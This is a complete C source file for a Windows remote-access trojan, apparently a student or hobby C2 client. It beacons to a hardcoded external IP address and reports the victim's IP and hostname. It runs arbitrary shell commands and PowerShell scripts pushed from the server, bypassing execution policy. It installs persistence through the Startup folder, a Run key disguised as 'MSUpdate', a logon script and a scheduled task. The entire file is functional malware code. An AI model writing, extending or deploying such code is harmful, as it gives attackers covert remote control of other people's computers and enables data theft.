#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

#define BUFFER_SIZE 4096
#define AES_KEY_SIZE 16
#define AES_BLOCK_SIZE 16
#define COMMAND_DELIMITER ";;;"

BYTE hardcoded_key[AES_KEY_SIZE] = "xxxxxxxxxxxxxxxx";
int BEACON = 0;
char* DIRNAME = "";
char STORE_PATH[MAX_PATH];
char BIN_PATH[MAX_PATH];

void create_socket(SOCKET *client_socket);
void connect_to_server(SOCKET client_socket);
void receive_commands(SOCKET client_socket);
void execute_script(const char *script);
int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size);
int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size);
void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size);
void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size);
char* base64_encode(const BYTE *data, DWORD data_length);
BYTE* base64_decode(const char *b64_string, DWORD *output_length);

void create_socket(SOCKET *client_socket) {
    *client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (*client_socket == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

void connect_to_server(SOCKET client_socket) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8081);
    server_addr.sin_addr.s_addr = inet_addr("142.93.219.215");
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Connection to server failed. Error Code: %d\n", WSAGetLastError());
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
    char client_ip[16];
    int client_port;
    getsockname(client_socket, (struct sockaddr *)&server_addr, &(int){sizeof(server_addr)});
    strcpy(client_ip, inet_ntoa(server_addr.sin_addr));
    client_port = ntohs(server_addr.sin_port);
    char hostname[MAX_PATH];
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
    char flags[BUFFER_SIZE];
    snprintf(flags, sizeof(flags), "IP_ADDRESS**%s**PORT_NUMBER**%d**HOSTNAME**%s", client_ip, client_port, hostname);
    BYTE encrypted_flags[BUFFER_SIZE];
    DWORD encrypted_size = sizeof(encrypted_flags);
    encrypt_data((BYTE *)flags, strlen(flags), encrypted_flags, &encrypted_size);
    char *b64_encrypted_flags = base64_encode(encrypted_flags, encrypted_size);
    send(client_socket, b64_encrypted_flags, strlen(b64_encrypted_flags), 0);
    free(b64_encrypted_flags);
}

void execute_script(const char *script) {
    char temp_script_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_script_path);
    strcat(temp_script_path, "temp_script.ps1");
    FILE *file = fopen(temp_script_path, "w");
    if (file == NULL) {
        perror("Failed to create temporary script file");
        return;
    }
    fputs(script, file);
    fclose(file);
    char command[MAX_PATH + 50];
    sprintf(command, "powershell.exe -ExecutionPolicy Bypass -File %s", temp_script_path);
    system(command);
    remove(temp_script_path); 
}

int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE *padded_plaintext = NULL;
    DWORD padded_size = 0;
    ULONG result_size = 0;
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    pkcs7_pad(plaintext, plaintext_size, &padded_plaintext, &padded_size);
    if (BCryptEncrypt(hKey, (PUCHAR)padded_plaintext, padded_size, NULL, NULL, 0, ciphertext, *ciphertext_size, &result_size, 0) != 0) {
        free(padded_plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    *ciphertext_size = result_size;
    free(padded_plaintext);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return 0;
}

int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG result_size = 0;
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertext_size, NULL, NULL, 0, plaintext, *plaintext_size, &result_size, 0) != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    *plaintext_size = result_size;
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    pkcs7_unpad(plaintext, plaintext_size);
    return 0;
}

void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size) {
    DWORD padding_len = AES_BLOCK_SIZE - (plaintext_size % AES_BLOCK_SIZE);
    *padded_size = plaintext_size + padding_len;
    *padded_plaintext = (BYTE *)malloc(*padded_size);
    memcpy(*padded_plaintext, plaintext, plaintext_size);
    memset(*padded_plaintext + plaintext_size, padding_len, padding_len);
}

void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size) {
    BYTE padding_len = padded_plaintext[*unpadded_size - 1];
    *unpadded_size -= padding_len;
}

char* base64_encode(const BYTE *data, DWORD data_length) {
    DWORD b64_length = 0;
    char *b64_string = NULL;
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64_length)) {
        return NULL;
    }
    b64_string = (char *)malloc(b64_length);
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64_string, &b64_length)) {
        free(b64_string);
        return NULL;
    }
    return b64_string;
}

BYTE* base64_decode(const char *b64_string, DWORD *output_length) {
    BYTE *decoded_data = NULL;
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, NULL, output_length, NULL, NULL)) {
        return NULL;
    }
    decoded_data = (BYTE *)malloc(*output_length);
    if (decoded_data == NULL) {
        return NULL;
    }
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, decoded_data, output_length, NULL, NULL)) {
        free(decoded_data);
        return NULL;
    }
    return decoded_data;
}

void receive_commands(SOCKET client_socket) {
    char buffer[BUFFER_SIZE];
    int bytes_received;
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            break;
        }
        buffer[bytes_received] = '\0';
        DWORD decoded_size = 0;
        BYTE *decoded_data = base64_decode(buffer, &decoded_size);
        if (decoded_data == NULL) {
            printf("Failed to decode Base64 data\n");
            continue;
        }
        BYTE decrypted_buffer[BUFFER_SIZE];
        DWORD decrypted_size = BUFFER_SIZE;
        decrypt_data(decoded_data, decoded_size, decrypted_buffer, &decrypted_size);
        decrypted_buffer[decrypted_size] = '\0';
        free(decoded_data);
        if (strncmp((char *)decrypted_buffer, "EXIT_CLIENT", 11) == 0) {
            break;
        }

        if (!strncmp(decrypted_buffer,"BEACON",6)) {
            char* option = strtok(decrypted_buffer, " ");
            char* action = strtok(NULL, " ");
            puts(action);
            if (!strcmp(action,"on"))
            {
                puts("Beacon is on");
                BEACON = 1;
            }
            else if (!strcmp(action,"off")){
                puts("Beacon is off");
                BEACON = 0;
            }
            continue;
        }

        // soft exit for beaconing
        if (!strncmp(decrypted_buffer, "CLOSE", 5)) {
            if (BEACON == 1) {
                closesocket(client_socket);
                WSACleanup();
                Sleep(100000);
                start_c2_client();
                continue;
            }
            else {
                const char *response = "Exiting client.";
                send(client_socket, response, strlen(response), 0);
                break;
            }
            break;
        }

        if (strncmp(decrypted_buffer,"PERSISTENT",10) == 0) {
            char* option = strtok(decrypted_buffer, " ");
            char* action = strtok(NULL, " ");
            option = strtok(NULL, " ");
            int isElevated = 0;
            if (strcmp(option, "startup") == 0 || strcmp(option, "registry") == 0 || strcmp(option, "logon") == 0 || strcmp(option, "schtask") == 0) {
                if (strcmp(action, "add") == 0) {
                    set_persistent(option, isElevated);
                } else if (strcmp(action, "remove") == 0) {
                    remove_persistence(option);
                } else {
                    const char *error_response = "Invalid action.";
                    send(client_socket, error_response, strlen(error_response), 0);
                }
            }
            else {
                const char *error_response = "Invalid option.";
                send(client_socket, error_response, strlen(error_response), 0);
            }
            continue;
        }


        if (strcmp(decrypted_buffer, "SCRIPT_START") == 0) {
            char script[BUFFER_SIZE * 10] = {0};
            while (1) {
                memset(buffer, 0, BUFFER_SIZE);
                bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
                if (bytes_received <= 0) break;
                buffer[bytes_received] = '\0';
                if (strstr(buffer, "SCRIPT_END") != NULL) {
                    strncat(script, buffer, bytes_received - strlen("SCRIPT_END"));
                    break;
                }
                strncat(script, buffer, bytes_received);
            }
            execute_script(script);
            const char *response = "Script executed successfully.";
            send(client_socket, response, strlen(response), 0);
            continue;
        }
        FILE *fp = _popen(decrypted_buffer, "r");
        if (fp) {
            char command_buffer[BUFFER_SIZE] = {0};
            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
                strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);
            }
            _pclose(fp);
            BYTE encrypted_result[BUFFER_SIZE];
            DWORD encrypted_size = sizeof(encrypted_result);
            encrypt_data((BYTE *)command_buffer, strlen(command_buffer), encrypted_result, &encrypted_size);
            char *b64_encrypted_result = base64_encode(encrypted_result, encrypted_size);
            send(client_socket, b64_encrypted_result, strlen(b64_encrypted_result), 0);
            free(b64_encrypted_result);
        } else {
            const char *error_response = "Command execution failed.";
            send(client_socket, error_response, strlen(error_response), 0);
        }
    }
    closesocket(client_socket);
}

// Dyanesh : Persistent Reverse Shell
void set_persistent(char* option, int isElevated) {

    if (!strcmp(option, "startup")) {
        char binpath[MAX_PATH];
        char command[400];
        GetModuleFileNameA(NULL, binpath, MAX_PATH);
        snprintf(command, sizeof(command), "copy %s \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", binpath);
        int res = system(command);
        if (res == 0) {
            printf("Added to startup\n");
        } else {
            printf("Failed to add to startup\n");
        }

    } else if (!strcmp(option, "registry")) {
        HKEY hkey;
        char binpath[MAX_PATH];
        GetModuleFileNameA(NULL, binpath, MAX_PATH);
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hkey, "MSUpdate", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
                printf("Added to registry\n");
            } else {
                printf("Failed to add to registry\n");
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key\n");
        }

    }

    else if (!strcmp(option, "logon")) {
        HKEY hkey;
        char binpath[MAX_PATH];
        snprintf(binpath, sizeof(binpath), "%s%s", STORE_PATH, "\\logon.bat");
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hkey, "UserInitMprLogonScript", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
                printf("Added to registry\n");
            } else {
                printf("Failed to add to registry\n");
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key\n");
        }

    }

    else if (!strcmp(option, "schtask"))  {
        if (isElevated == 0) {
            printf("You need to be elevated to add to task scheduler\n");
            return;
        }
        char command[500];
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);

        // Create the command for schtasks
        snprintf(command, sizeof(command), "schtasks /create /tn \"Wind0ws Apps\" /tr \"%s\" /sc onlogon /ru %s /F", BIN_PATH, username);

        // Execute the command using system()
        int res = system(command);

        // Check the result of system()
        if (res == 0) {
            printf("Added to task scheduler\n");
        } else {
            printf("Failed to add to task scheduler. system() returned error code: %d\n", res);
        }
    }

}


// To setup a folder for storing some files
void setup_storagepath() {
    if (!(SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, STORE_PATH)))) {
        strcat(STORE_PATH, "\\.Wind0wsApp");
        if (GetFileAttributesA(STORE_PATH) == INVALID_FILE_ATTRIBUTES) {
            CreateDirectoryA(STORE_PATH, NULL);
        }
    }
    else {
        GetModuleFileNameA(NULL, BIN_PATH, MAX_PATH);
        GetModuleFileNameA(NULL, STORE_PATH, MAX_PATH);
        char* last_slash = strrchr(STORE_PATH, '\\');
        *last_slash = '\0';
    }
}

// Cleanup of malware traces after exiting connection

void remove_storagepath() {
    if (GetFileAttributesA(STORE_PATH) != INVALID_FILE_ATTRIBUTES) {
        RemoveDirectoryA(STORE_PATH);
    }
}


void remove_persistence(char* option) {
    if (!strcmp(option, "startup")) {
        char command[400];
        snprintf(command, sizeof(command), "del \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe\"");
        int res = system(command);
        if (res == 0) {
            printf("Removed from startup\n");
        } else {
            printf("Failed to remove from startup\n");
        }

    } else if (!strcmp(option, "registry")) {
        HKEY hkey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
        
        if (result == ERROR_SUCCESS) {
            result = RegDeleteValueA(hkey, "MSUpdate");
            if (result == ERROR_SUCCESS) {
                printf("Removed from registry\n");
            } else {
                printf("Failed to remove from registry. Error code: %ld\n", result);
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key. Error code: %ld\n", result);
        }

    } else if (!strcmp(option,"logon")) {
        HKEY hkey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hkey);

        if (result == ERROR_SUCCESS) {
            result = RegDeleteValueA(hkey, "UserInitMprLogonScript");
            if (result == ERROR_SUCCESS) {
                printf("Removed from registry\n");
            } else {
                printf("Failed to remove from registry. Error code: %ld\n", result);
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key. Error code: %ld\n", result);
        }

    } else if (!strcmp(option, "schtask"))  {
        char command[500];

        // Create the command for schtasks to delete the task
        snprintf(command, sizeof(command), "schtasks /delete /tn \"Wind0ws Apps\" /f");

        // Execute the command using system()
        int res = system(command);

        // Check the result of system()
        if (res == 0) {
            printf("Removed from task scheduler\n");
        } else {
            printf("Failed to remove from task scheduler. system() returned error code: %d\n", res);
        }
    }
}


void start_c2_client() {
    WSADATA wsaData;
    SOCKET client_socket;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return;
    }
    create_socket(&client_socket);
    connect_to_server(client_socket);
    receive_commands(client_socket);
    WSACleanup();
}

int main() {

    // startups
    setup_storagepath();
    start_c2_client();
    return EXIT_SUCCESS;
}
